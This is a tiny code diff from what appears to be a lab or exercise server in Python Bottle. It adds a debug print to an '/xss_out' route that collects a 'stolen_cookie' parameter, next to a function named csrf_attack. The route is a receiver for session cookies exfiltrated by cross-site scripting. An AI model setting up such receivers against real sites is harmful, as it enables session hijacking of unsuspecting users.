@@ -16,6 +16,7 @@ def csrf_attack():
 # Usage: http://localhost:8081/xss_out?stolen_cookie=321
 @get('/xss_out')
 def receive_xss_output():
+    print("hello")
     session_id = request.query.get('stolen_cookie')
     print("Received session cookie: {}".format(session_id))
     return
